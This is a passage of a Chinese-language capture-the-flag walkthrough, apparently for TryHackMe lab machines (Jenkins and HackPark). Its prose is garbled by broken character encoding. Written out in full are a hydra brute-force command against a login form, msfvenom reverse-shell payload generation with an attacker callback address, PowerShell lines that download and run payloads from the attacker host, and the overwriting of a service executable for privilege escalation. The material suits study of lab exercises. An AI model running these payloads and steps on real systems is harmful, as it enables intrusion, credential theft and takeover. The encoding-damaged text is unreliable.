ç°åœ¨æˆ‘ä»¬æœ‰äº†åˆå§‹è®¿é—®æƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨ä»¤ç‰Œæ¨¡æ‹Ÿæ¥è·å¾—systemè®¿é—®æƒé™ï¼ˆsystemæƒé™æ˜¯Windowsç³»ç»Ÿä¸­çš„æœ€é«˜çº§åˆ«æƒé™ï¼‰ã€‚Windows å¯ä»¥ä½¿ç”¨ä»¤ç‰Œæ¥ç¡®ä¿æŸä¸ªè´¦æˆ·å…·æœ‰æ‰§è¡Œç‰¹å®šæ“ä½œçš„æ­£ç¡®æƒé™ï¼Œå½“ç”¨æˆ·æˆåŠŸç™»å½•æˆ–é€šè¿‡èº«ä»½éªŒè¯æœºåˆ¶æ—¶ï¼Œè´¦æˆ·ä»¤ç‰Œï¼ˆtokens ï¼‰å°±ä¼šè¢«åˆ†é…ç»™è´¦æˆ·ï¼Œè¿™é€šå¸¸ç”± LSASS.exe å®Œæˆï¼ˆä½ å¯ä»¥å°†å…¶è§†ä¸ºä¸€ä¸ªèº«ä»½éªŒè¯è¿›ç¨‹ï¼‰ã€‚ æ­¤è®¿é—®ä»¤ç‰ŒåŒ…æ‹¬ä»¥ä¸‹ä¿¡æ¯ï¼š user SIDs(security identifier) group SIDs privileges é™¤å…¶ä»–äº‹é¡¹å¤–ï¼Œæ›´è¯¦ç»†çš„ä¿¡æ¯è¯·å‚è€ƒï¼šhttps://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens æœ‰ä¸¤ç§ç±»å‹çš„è®¿é—®ä»¤ç‰Œï¼š ä¸»è®¿é—®ä»¤ç‰Œ(primary access tokens)ï¼šæ­¤ç±»ä»¤ç‰Œæ˜¯æŒ‡ä¸ç™»å½•æ—¶æ‰€ç”Ÿæˆçš„ç”¨æˆ·è´¦æˆ·ç›¸å…³è”çš„ä»¤ç‰Œã€‚ æ¨¡æ‹Ÿä»¤ç‰Œ(impersonation tokens)ï¼šæ­¤ç±»ä»¤ç‰Œèƒ½å¤Ÿå…è®¸ç‰¹å®šè¿›ç¨‹ï¼ˆæˆ–è¿›ç¨‹ä¸­çš„çº¿ç¨‹ï¼‰ä½¿ç”¨å¦ä¸€ä¸ªï¼ˆç”¨æˆ·/å®¢æˆ·ç«¯ï¼‰è¿›ç¨‹çš„ä»¤ç‰Œæ¥è®¿é—®ç›¸å…³çš„èµ„æºã€‚ å¯¹äºæ¨¡æ‹Ÿä»¤ç‰Œï¼Œæœ‰ä¸åŒçš„çº§åˆ«ï¼š SecurityAnonymousï¼šå½“å‰ ç”¨æˆ·/å®¢æˆ·ç«¯ ä¸èƒ½æ¨¡æ‹Ÿå¦ä¸€ä¸ª ç”¨æˆ·/å®¢æˆ·ç«¯ã€‚ SecurityIdentificationï¼šå½“å‰ ç”¨æˆ·/å®¢æˆ·ç«¯ å¯ä»¥è·å¾—å®¢æˆ·ç«¯çš„èº«ä»½å’Œæƒé™ï¼Œä½†ä¸èƒ½æ¨¡æ‹Ÿå®¢æˆ·ç«¯ã€‚ SecurityImpersonationï¼šå½“å‰ ç”¨æˆ·/å®¢æˆ·ç«¯ å¯ä»¥åœ¨æœ¬åœ°ç³»ç»Ÿä¸Šæ¨¡æ‹Ÿå®¢æˆ·ç«¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ã€‚ SecurityDelegationï¼šå½“å‰ ç”¨æˆ·/å®¢æˆ·ç«¯ å¯ä»¥åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šæ¨¡æ‹Ÿå®¢æˆ·ç«¯çš„å®‰å…¨ä¸Šä¸‹æ–‡ã€‚ tipsï¼šè¿™é‡Œçš„å®‰å…¨ä¸Šä¸‹æ–‡æ˜¯æŒ‡ä¸€ä¸ªåŒ…å«ç”¨æˆ·ç›¸å…³å®‰å…¨ä¿¡æ¯çš„æ•°æ®ç»“æ„ã€‚ è´¦æˆ·æ‰€å…·æœ‰çš„æƒé™ï¼ˆåœ¨è´¦æˆ·åˆ›å»ºæ—¶æˆäºˆè´¦æˆ·çš„æƒé™æˆ–è€…ä»groupå¤„ç»§æ‰¿çš„æƒé™ï¼‰èƒ½å¤Ÿå…è®¸å¯¹åº”ç”¨æˆ·æ‰§è¡Œä¸€äº›ç‰¹å®šæ“ä½œï¼Œä»¥ä¸‹æ˜¯æœ€å¸¸è¢«æ»¥ç”¨çš„ç‰¹æƒï¼š SeImpersonatePrivilege SeAssignPrimaryPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeTakeOwnershipPrivilege SeDebugPrivilege æ›´å¤šå…³äºä»¤ç‰Œç‰¹æƒæ»¥ç”¨çš„ä¿¡æ¯è¯·å‚è€ƒï¼šhttps://www.exploit-db.com/papers/42556 è¾“å…¥whoami /privæŸ¥çœ‹å½“å‰ç”¨æˆ·æ‰€æœ‰æƒé™ å¯ä»¥çœ‹åˆ°ç›®æ ‡æœºå¯ç”¨äº†ä¸¤ä¸ªå…³é”®æƒé™ï¼ˆSeDebugPrivilegeã€SeImpersonatePrivilegeï¼‰ï¼Œè¿™ä¸¤ä¸ªæƒé™èƒ½å¤Ÿè®©æˆ‘ä»¬ä½¿ç”¨MSFä¸­çš„æ¨¡å—æ¥è¿›è¡Œä»¤ç‰Œæ¨¡æ‹Ÿæ“ä½œ æ¥ç€åœ¨meterpreter shellä¸­load incognito æ¨¡å—åŠ è½½å®Œæˆä¹‹å è¾“å…¥list_tokens -gå‘½ä»¤æ£€æŸ¥å“ªäº›ä»¤ç‰Œå¯ç”¨ï¼Œæˆ‘ä»¬å‘ç°BUILTIN\\Administratorsä»¤ç‰Œå¯ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ¨¡æ‹Ÿç®¡ç†å‘˜ä»¤ç‰Œï¼Œæ¨¡æ‹Ÿå®Œæˆåï¼Œå†è¿è¡Œgetuidå‘½ä»¤ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶æˆ‘ä»¬çš„uidå·²ç»å˜æ›´ä¸ºSYSTEMçš„uidï¼Œè¯´æ˜æ¨¡æ‹Ÿä»¤ç‰ŒæˆåŠŸã€‚ å³ä½¿æˆ‘ä»¬ç°åœ¨æ‹¥æœ‰æ›´é«˜ç‰¹æƒçš„ä»¤ç‰Œï¼ˆtoken ï¼‰ï¼Œæˆ‘ä»¬å®é™…ä¸Šä¹Ÿå¯èƒ½æ²¡æœ‰å¯¹åº”çš„ç‰¹æƒç”¨æˆ·çš„æƒé™ï¼ˆç”±äº Windows å¤„ç†æƒé™çš„æ–¹å¼ - Windowsä¼šä½¿ç”¨ä¸»ä»¤ç‰Œè€Œä¸æ˜¯æ¨¡æ‹Ÿä»¤ç‰Œæ¥ç¡®å®šæŸä¸ªè¿›ç¨‹çš„æƒé™åˆ†é…æƒ…å†µï¼‰ï¼›æ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦è¿ç§»åˆ°å…·æœ‰æ­£ç¡®æƒé™çš„è¿›ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©è¿ç§»åˆ°æœ€å®‰å…¨çš„services.exeè¿›ç¨‹ï¼Œé¦–å…ˆä½¿ç”¨pså‘½ä»¤æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹ï¼Œæ‰¾åˆ°services.exeè¿›ç¨‹çš„PIDï¼Œç„¶åä½¿ç”¨migrate PID-OF-PROCESSè¿ç§»åˆ°ç›®æ ‡è¿›ç¨‹ï¼Œå…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š getpid #æŸ¥çœ‹å½“å‰è¿›ç¨‹pid ps #æŸ¥çœ‹æ‰€æœ‰çš„è¿›ç¨‹ migrate 668 #è¿ç§»åˆ°services.exeè¿›ç¨‹ éœ€æŒ‡å®šç›®æ ‡è¿›ç¨‹çš„PIDå· æ€»ç»“ ä¾æ—§æ˜¯åˆ©ç”¨é¶æœºçš„webç«™ç‚¹ç¼ºç‚¹ï¼Œå¯¹æ–¹å«æœ‰jenkinsç»„ä»¶ï¼Œè¯¥ç»„ä»¶çš„ç‰ˆæœ¬æ°å¥½å­˜åœ¨æ¼æ´ï¼Œåˆ©ç”¨å…¶ä¸­çš„æŸä¸ªåŠŸèƒ½èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œæ¥ç€åˆ©ç”¨å…¶æ‰§è¡Œäº†powershellçš„åå¼¹shellè„šæœ¬ï¼Œncç›‘å¬æ‹¿åˆ°shellï¼Œä¹‹åä¸ºäº†ç¨³å®š+æ–¹ä¾¿ï¼Œè¦åˆ‡æ¢åˆ°meterpreter shellï¼Œæ€è·¯æ˜¯msfvenomç”Ÿæˆmeterpreter reverse_shellä¸Šä¼ åˆ°é¶æœºä¹‹åï¼Œè¿è¡Œï¼ˆåœ¨æœ¬åœ°å¼€äº†msfç›‘å¬æ¨¡å—ï¼‰ä¹‹åæˆåŠŸæ‹¿åˆ°shellï¼Œä¹‹ååˆ©ç”¨æ¨¡ä»¿ä»¤ç‰Œæ¥ææƒï¼Œload incognitoçœ‹åˆ°å¯¹æ–¹å¯ä»¥æ¨¡ä»¿çš„ä»¤ç‰Œä¹‹åï¼Œåˆ©ç”¨å‘½ä»¤æˆåŠŸæ¨¡ä»¿ï¼Œä½†æˆ‘ä»¬å½“å‰æ˜¯æ¨¡ä»¿ä»¤ç‰Œä½†ä¸æ˜¯ä¸»ä»¤ç‰Œï¼Œå› æ­¤éœ€è¦migrateè¿ç§»åˆ°æ­£ç¡®æƒé™çš„ç¨‹åºï¼Œä¹‹åå°±æˆåŠŸææƒï¼ˆè¿™é‡Œæˆ‘æ²¡æœ‰å°è¯•ç›´æ¥è¿ç§»ä¼šå¦‚ä½•ï¼Œä¸‹æ¬¡å¾—è®°ç€ï¼‰ã€‚ 0x06 HackParkæŒ‘æˆ˜ è¿æ¥åˆ°æˆ‘ä»¬çš„ç½‘ç»œå¹¶éƒ¨ç½²è¿™å°æœºå™¨ã€‚è¯·è€å¿ƒç­‰å¾…ï¼Œå› ä¸ºè¿™å°æœºå™¨æœ€å¤šå¯èƒ½éœ€è¦ 5 åˆ†é’Ÿæ‰èƒ½å¯åŠ¨ï¼æ‚¨å¯ä»¥é€šè¿‡è®¿é—®æˆ‘ä»¬çš„è®¿é—®é¡µé¢æ¥æµ‹è¯•æ‚¨æ˜¯å¦è¿æ¥åˆ°æˆ‘ä»¬çš„ç½‘ç»œã€‚è¯·æ³¨æ„ï¼Œæ­¤è®¡ç®—æœºä¸å“åº” ping ï¼ˆICMPï¼‰ï¼Œå¯èƒ½éœ€è¦å‡ åˆ†é’Ÿæ‰èƒ½å¯åŠ¨ã€‚ æœ¬ä¼šè®®å®¤å°†ä»‹ç»æš´åŠ›ç ´è§£å¸æˆ·å‡­æ®ã€å¤„ç†å…¬å…±æ¼æ´ã€ä½¿ç”¨ Metasploit æ¡†æ¶å’Œ Windows ä¸Šçš„æƒé™å‡çº§ã€‚ hydraæš´åŠ›ç ´è§£ Hydra æ˜¯ä¸€ç§å¹¶è¡ŒåŒ–ã€å¿«é€Ÿä¸”çµæ´»çš„ç™»å½•ç ´è§£å·¥å…·ã€‚ æš´åŠ›ç ´è§£ä¼šå°è¯•ä½¿ç”¨å¤šç§å¯†ç ç»„åˆè¿›è¡Œç™»å½•ã€‚ å­—å…¸æ”»å‡»ä¹Ÿæ˜¯ä¸€ç§æš´åŠ›ç ´è§£ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å­—å…¸å†…å®¹è¿­ä»£æ¥è·å–æ­£ç¡®çš„å¯†ç ç»„åˆã€‚ æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç™»å½•é¡µé¢æ¥æ”»å‡»å¹¶ç¡®å®šè¡¨å•å‘ç½‘ç»œæœåŠ¡å™¨å‘å‡ºçš„è¯·æ±‚ç±»å‹ã€‚é€šå¸¸ï¼ŒWeb æœåŠ¡å™¨å‘å‡ºä¸¤ç§ç±»å‹çš„è¯·æ±‚ï¼Œä¸€ç§æ˜¯ç”¨äºä» Web æœåŠ¡å™¨è¯·æ±‚æ•°æ®çš„ GET è¯·æ±‚ï¼Œå¦ä¸€ç§æ˜¯ç”¨äºå‘æœåŠ¡å™¨å‘é€æ•°æ®çš„ POST è¯·æ±‚ã€‚ æ‚¨å¯ä»¥é€šè¿‡å³é”®å•å‡»ç™»å½•è¡¨å•ï¼Œæ£€æŸ¥å…ƒç´ ï¼Œç„¶åè¯»å–æ–¹æ³•å­—æ®µä¸­çš„å€¼æ¥æ£€æŸ¥è¡¨å•å‘å‡ºçš„è¯·æ±‚ã€‚å¦‚æœæ‚¨é€šè¿‡ BurpSuite æ‹¦æˆªæµé‡ï¼Œæ‚¨ä¹Ÿå¯ä»¥è¯†åˆ«è¿™ä¸€ç‚¹ï¼ˆå¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°å…¶ä»– HTTP æ–¹æ³•ï¼‰ã€‚ Windows ç½‘ç«™ç™»å½•è¡¨å•ä½¿ç”¨ä»€ä¹ˆè¯·æ±‚ç±»å‹ï¼Ÿâ€”â€”POSTç±»å‹ ç°åœ¨æˆ‘ä»¬çŸ¥é“è¯·æ±‚ç±»å‹å’Œç™»å½•è¡¨å•çš„ URLï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨hydraå¯¹ç™»é™†æ¡†è¿›è¡Œæš´åŠ›ç ´è§£ã€‚ æˆ‘ä»¬å°†å¡«å……å¹¶ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š hydra -l &lt;username&gt; -P /usr/share/wordlists/&lt;wordlist&gt; &lt;ip&gt; http-post-form &lt;login request pattern&gt; #å…³äºhttp-post-formï¼š\"&lt;path to login form&gt;:&lt;body, with magic strings ^USER^ and ^PASS^&gt;:&lt;pattern that appears in an invalid login&gt;\" éœ€è¦å¡«å……çš„å­—æ®µæœ‰ï¼šç”¨æˆ·åï¼ˆadminï¼‰å’ŒIP(é¶æœºIP)ä»¥åŠå­—å…¸ï¼ˆrockyou.txtï¼‰ï¼Œåœ¨http-post-fromååŠ ä¸Šç½‘ç«™ç™»é™†é¡µçš„URLä»¥åŠPOSTè¯·æ±‚æ‰€å¯¹åº”çš„è¡¨å•æ•°æ®ï¼ˆè¡¨å•æ•°æ®å¯é€šè¿‡BurpæŠ“å–æˆ–è€…åœ¨æµè§ˆå™¨ç«¯ç›´æ¥æŸ¥çœ‹ï¼‰ï¼Œå…¶ä¸­ç”¨æˆ·åå’Œå¯†ç è¦ä¿®æ”¹æ ¼å¼ï¼ˆUSERå’ŒPASSï¼‰ï¼Œæœ€åå†åŠ ä¸Šç™»å½•é”™è¯¯æ—¶çš„æç¤ºè¯­å¥â€œLogin failedâ€ï¼ˆå°†æµè§ˆå™¨è¯­è¨€è®¾ç½®ä¸ºè‹±æ–‡ï¼‰ã€‚ å…·ä½“å‘½ä»¤å¦‚ä¸‹ï¼š hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.9.70 http-post-form \"/Account/login.aspx:__VIEWSTATE=A79cd%2Fd56MBqXHayonGgo9MFuFbQU6QPgXzIC%2B9FMhzTK7iMPj4zufjKqn3GNZWqtmDPLnM3RtK7TkB%2BYvlEkWuMDAJirSykwjQ%2FxVGWAv5Cyji4ywzRTSm9iL8I8dMNvvhWDbZe6qWUFX%2FEOOnmbrp1mU4IPOxzJGSnYTY2CNw6wYAJHPUHh%2FB388uvKDteVckgTZtgt66yI8xd5etFdURzNBbnCs4dJswVuPShvKWGKbJUyHFJ5jadz4XvkArprAEcDAd9Ll%2F5zkDvEiLHoGYMwRJLCQj05O1NF7MYjsnmc0WKGMfbhqXmWkGAwpvRJolCxYkjmJfsevJUigud7%2BppQIWb%2BVcVi00Eo8qr1RtOJ%2FKB&amp;__EVENTVALIDATION=QRBLSmDgKfpCrfL79eVdKup%2FRJ91Bmhgi7SgxOupvZnLmSVshmyDfmOIr%2BKc%2FyeXqYKrM4YA%2FHCfDF3SfBc%2BT1Wpxa9ownCMxyjUQ5Y3drEvWm11h2mdfvuiMXcRGqkQ7Li8bDSDDgR13qwydwbPI6xcL1ciNTevksX%2BsVcHfSVf8W1w&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed\" d è¿™é‡Œéœ€è¦å°†æµè§ˆå™¨è¯­è¨€è®¾ç½®ä¸ºè‹±æ–‡ï¼Œè¿˜éœ€è¦é…ç½®ç™»é™†å¤±è´¥æç¤ºè¯­ï¼ˆé¡µé¢å›æ˜¾å‘ç°çš„ï¼‰ Hydra æœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œå¹¶ä¸”æœ‰è®¸å¤šå¯ç”¨çš„â€œæ¨¡å—â€ï¼ˆæˆ‘ä»¬åˆšæ‰ä½¿ç”¨çš„ http-post-formå°±æ˜¯æ¨¡å—çš„ä¸€ç§ï¼‰ï¼Œæ­¤å·¥å…·ä¸ä»…é€‚ç”¨äºæš´åŠ›ç ´è§£ HTTP è¡¨å•ï¼Œè¿˜é€‚ç”¨äºç ´è§£å…¶ä»–è®¡ç®—æœºåè®®ç›¸å…³çš„ç™»é™†å¯†ç ï¼Œä¾‹å¦‚ FTPã€SSHã€SMTPã€SMB ç­‰åè®®ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªå…³äºHydraçš„è¿·ä½ å¤‡å¿˜å•ï¼š å‘½ä»¤ è¯´æ˜ hydra -P &lt;wordlist&gt; -v &lt;ip&gt; &lt;protocol&gt; é’ˆå¯¹æŸä¸€åè®®è¿›è¡Œæš´åŠ›ç ´è§£æ“ä½œ hydra -v -V -u -L &lt;username list&gt; -P &lt;password list&gt; -t 1 -u &lt;ip&gt; &lt;protocol&gt; ä½¿ç”¨Hydraæ¥æš´åŠ›ç ´è§£ç”¨æˆ·åå’Œå¯†ç ï¼ˆ-vVï¼šè¡¨ç¤ºä½¿ç”¨è¯¦ç»†æ¨¡å¼ï¼‰ã€‚ hydra -t 1 -V -f -l &lt;username&gt; -P &lt;wordlist&gt; rdp://&lt;ip&gt; ä½¿ç”¨å¯†ç å­—å…¸ä»¥æ”»å‡»Windowsè¿œç¨‹æ¡Œé¢ä¸»æœºã€‚ hydra -l &lt;username&gt; -P &lt;password list&gt; $ip -V http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location' ä¸ºHydraæä¾›æ›´å…·ä½“çš„ä¿¡æ¯ä»¥è¿›è¡Œæš´åŠ›ç ´è§£æ“ä½œã€‚ è·å–ç›®æ ‡webåº”ç”¨ç¨‹åºçš„åˆå§‹shell è¯†åˆ«å¹¶æ‰§è¡Œä¸€ä¸ªå…¬å…±æ¼æ´åˆ©ç”¨è„šæœ¬ï¼ˆæ¥è‡ª exploit-db.comï¼‰ä»¥åœ¨ç›®æ ‡Windowsæœºå™¨ä¸Šè·å¾—åˆå§‹è®¿é—®æƒé™ï¼ Exploit-Database æ˜¯ä¸€ä¸ª CVEï¼ˆå¸¸è§æ¼æ´å’Œæ³„éœ²ï¼‰å­˜æ¡£åº“ï¼Œè¯¥åº“ç”¨äºä¿å­˜ä¸€äº›å…¬å¼€æ¼æ´expå’Œç›¸åº”çš„æ˜“å—æ”»å‡»çš„è½¯ä»¶ä¿¡æ¯ï¼Œä»¥ä¾¿äºæ¸—é€æµ‹è¯•äººå‘˜ä½¿ç”¨å’Œå¼€å±•æ¼æ´ç ”ç©¶ã€‚Exploit-Database ç”± Offensive Securityç»„ç»‡æ‰€ç»´æŠ¤ï¼ˆè¯¥ç»„ç»‡åŒæ—¶ä¹Ÿè´Ÿè´£OSCPå’ŒKaliï¼‰ã€‚ ç™»å½•è¿›å»ä¹‹åå‘ç°è¯¥ç½‘ç«™æ‰€ä½¿ç”¨çš„æ¡†æ¶ï¼Œä¸Šexploitæœç´¢ç›¸å…³æ¼æ´ æœåˆ°ä¹‹åï¼Œè·Ÿç€ç›®å½•æè¿°ä¸€æ­¥æ­¥æ‹¿åˆ°shell First, we set the TcpClient address and port within the method below to * our attack host, who has a reverse tcp listener waiting for a connection. * Next, we upload this file through the file manager. In the current (3.3.6) * version of BlogEngine, this is done by editing a post and clicking on the * icon that looks like an open file in the toolbar. Note that this file must * be uploaded as PostView.ascx. Once uploaded, the file will be in the * /App_Data/files directory off of the document root. The admin page that * allows upload is: ç®€å•è¯´å°±æ˜¯ç°åœ¨expæ–‡ä»¶ä¿®æ”¹ç›‘å¬ç«¯å£å’ŒIPï¼Œæ¥ç€åœ¨å¦‚ä¸‹å›¾æ‰€ç¤ºçš„åœ°æ–¹ä¸Šä¼ æ–‡ä»¶ï¼Œæ³¨æ„æ–‡ä»¶åå¿…é¡»æ˜¯PostView.ascx ä¹‹åè®¿é—®æŒ‡å®šç›®å½•ï¼šhttp://IP/?theme=../../App_Data/fileså³å¯æ‹¿åˆ°shell æƒé™æå‡ åœ¨æ­¤ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†äº†è§£ Windows æƒé™æå‡çš„åŸºç¡€çŸ¥è¯†ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬å°†ä» netcat è½¬å‘ meterpreter ä¼šè¯ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥æšä¸¾æœºå™¨ä»¥è¯†åˆ«æ½œåœ¨çš„æ¼æ´ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æ”¶é›†åˆ°çš„ä¿¡æ¯æ¥åˆ©ç”¨è¯¥ç³»ç»Ÿå¹¶æˆä¸ºç®¡ç†å‘˜ã€‚ ä¸Šä¸€å°èŠ‚å»ºç«‹çš„netcat ä¼šè¯æœ‰ç‚¹ä¸ç¨³å®šï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ msfvenom æ¥å»ºç«‹ä¸€ä¸ªæ–°çš„åå‘shellã€‚æˆ‘ä»¬å¯ä»¥å°†æ™®é€šshellå‡çº§ä¸º meterpreterä¼šè¯ï¼Œæ­¤å¤„éœ€è¦ä½¿ç”¨ metasploit æ¥è®¾ç½®ä¸€ä¸ªç›‘å¬å™¨ã€‚ é¦–å…ˆï¼Œå¯åŠ¨ä¸€ä¸ªç»ˆç«¯ï¼Œè¿è¡Œmetasploitå¹¶å¯åŠ¨ä¸€ä¸ªç›‘å¬å™¨ã€‚â€”â€”è€ç”Ÿå¸¸è°ˆäº† msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.81.232 LPORT=5555 -e x86/shikata_ga_nai -f exe -o shell.exe æ¥ç€å¼€å¯httpæœåŠ¡ï¼Œä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœºä¸Š ä½¿ç”¨ä¸Šä¸€å°èŠ‚ä¸­æ‰€å»ºç«‹çš„shellç•Œé¢æ‹‰å–æœ¬åœ°æœºä¸­çš„exeæ–‡ä»¶åˆ°ç›®æ ‡æœºä¸Šå¹¶æ‰§è¡Œè¯¥exeæ–‡ä»¶ã€‚ tipsï¼š æˆ‘ä»¬é€šå¸¸ä¼šå‘ç°ç›®æ ‡ç³»ç»Ÿçš„C:\\Windows\\Tempæ˜¯å…¨å±€å¯å†™çš„ï¼æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹åœ¨ç›®æ ‡æœºä¸Šæ“ä½œâ€“æ‹‰å–æœ¬åœ°æœºä¸­çš„æ–‡ä»¶åˆ°ç›®æ ‡ç³»ç»Ÿä¸Šå¹¶å°è¯•æ‰§è¡Œè¿™äº›æ–‡ä»¶ã€‚ ä¾‹å­ï¼ˆå‰ææ˜¯åœ¨æœ¬åœ°æœºå¯åŠ¨httpæœåŠ¡å™¨ï¼‰ï¼špowershell -c â€œInvoke-WebRequest -Uri â€˜ip/shell.exeâ€™ -OutFile â€˜C:\\Windows\\Temp\\shell.exeâ€™â€ ä½¿ç”¨ .\\filename.exe åœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œè¿™äº›æ–‡ä»¶ã€‚ sysinfoæŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯ åœ¨æ­¤å¤„ï¼šæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåä¸º WinPEAS çš„å·¥å…·ã€‚ WinPEAS æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œå®ƒå¯ä»¥åœ¨ Windows æœºå™¨ä¸Šæ‰¾åˆ°å¯èƒ½ä¼šè¢«æ”»å‡»è€…åˆ©ç”¨çš„è·¯å¾„å’ŒæœåŠ¡ã€‚ è„šæœ¬åœ°å€ï¼šhttps://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe ä¸Šä¼ WinPEASè„šæœ¬æ–‡ä»¶åˆ°ç›®æ ‡æœºï¼ˆæ–¹æ³•å’Œä¹‹å‰ç±»ä¼¼ï¼Œæ­¤å¤„ä½¿ç”¨ç¬¬ä¸‰å°èŠ‚ä¸­å»ºç«‹çš„çš„æ™®é€šshellç•Œé¢è¿›è¡Œä¸Šä¼ ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨åˆšæ‰å»ºç«‹çš„meterpreter ä¼šè¯è¿›è¡Œä¸Šä¼ ï¼‰ å¼‚å¸¸æœåŠ¡å°±æ˜¯ä¸Šè¿°çš„çº¢è‰²æ¡†ä¸­çš„ï¼Œè¿™é‡Œæ˜¯çœ‹ä¸å‡ºæ¥è¿è¡Œçš„exeæ–‡ä»¶çš„ï¼Œè¿˜éœ€è¦è¿›å…¥systemschedulerç›®å½•ä¸‹çœ‹çœ‹ å¦‚ä¸Šå›¾çœ‹åˆ°äº†ä¼—å¤šçš„exeæ–‡ä»¶ï¼Œä½†æˆ‘ä»¬è¦æ‰¾çš„æ˜¯è¯¥æœåŠ¡ä¼šå»è¿è¡Œçš„ç¨‹åºï¼Œå› æ­¤éœ€è¦è¿›å…¥Eventsäº‹ä»¶æŸ¥çœ‹å™¨çœ‹ä¸€ä¸‹è¯¥æœåŠ¡çš„è¿è¡Œæ—¥å¿— å¯ä»¥çœ‹åˆ°è¿è¡Œçš„ç¨‹åºæ–‡ä»¶ä¸ºMessage.exeï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä½¿ç”¨è¯¥ç¨‹åºæå‡æƒé™ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.81.232 LPORT=5555 -e x86/shikata_ga_nai -f exe -o Message.exe copy Message.exe \"C:\\Program Files (x86)\\SystemScheduler\\Message.exe\" è¿™æ ·ä¾¿æˆåŠŸè¦†ç›–ä¸Šè¿°æ­£å¸¸exeæ–‡ä»¶ï¼Œä¹‹åç›´æ¥runè¿è¡Œç›‘å¬æ¨¡å—å³å¯ï¼Œå› ä¸ºè¯¥æœåŠ¡ä¼šæŒç»­è¿è¡ŒMessage.exe å‘ç°æˆåŠŸä¸ºç®¡ç†å‘˜èº«ä»½ æ²¡æœ‰ Metasploit çš„æƒé™å‡çº§ åœ¨è¿™ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å°†åœ¨ä¸ä½¿ç”¨ meterpreter/metasploit çš„æƒ…å†µä¸‹å‡çº§æˆ‘ä»¬çš„æƒé™ï¼ é¦–å…ˆï¼Œæˆ‘ä»¬å°†ä»æˆ‘ä»¬å·²ç»å»ºç«‹çš„ netcat ä¼šè¯è½¬å‘æ›´ç¨³å®šçš„åå‘ shellã€‚ä¸€æ—¦æˆ‘ä»¬ç¡®å®šäº†è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨winPEASæ¥æšä¸¾ç³»ç»Ÿçš„æ½œåœ¨æ¼æ´ï¼Œç„¶åå†ä½¿ç”¨æ­¤ä¿¡æ¯ä¸ŠæŠ¥ç»™ç®¡ç†å‘˜ã€‚ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.81.232 LPORT=8888 -e x86/shikata_ga_nai -f exe -o shell.exe powershell -c wget \"http://10.11.81.232:81/reverse.exe\" -outfile reverse.exe æœ€ç»ˆæˆåŠŸæ‹¿åˆ° æ€»ç»“ è¿™é‡Œä¾æ—§æ˜¯é’ˆå¯¹webç«™ç‚¹çš„æ¼æ´ï¼Œé¦–å…ˆæµ‹è¯•å‘ç°å­˜åœ¨å¯ä»¥æš´åŠ›ç ´è§£çš„htmlè¡¨å•ï¼Œä½¿ç”¨hydraç ´è§£ä¹‹åï¼Œå‘ç°è¯¥ç«™ç‚¹çš„ç»„ä»¶å­˜åœ¨æ¼æ´ï¼Œåˆ©ç”¨æ¼æ´åˆ©ç”¨æè¿°æ–¹æ³•ï¼Œncç›‘å¬æ‹¿åˆ°shellï¼Œä¹‹åå°±è½¬æ¢ä¸ºmeterpreter shellï¼ˆè€ç”Ÿå¸¸è°ˆäº†ï¼Œä¸èµ˜è¿°ï¼‰ç„¶åä¸Šä¼ winPEAS.exeå‘ç°å­˜åœ¨æœåŠ¡é…ç½®ç¼ºé™·ï¼Œä¸è¿‡è¿™é‡Œè¿˜æœ‰ç‚¹ä¸œè¥¿çš„ï¼Œå› ä¸ºä½ å¯ä»¥çœ‹åˆ°è¯¥æœåŠ¡ç›®å½•ä¸‹å­˜åœ¨å¤šä¸ªexeï¼Œæ— æ³•åˆ¤æ–­è¯¥æœåŠ¡è¿è¡Œçš„æ˜¯è°ï¼Œå› 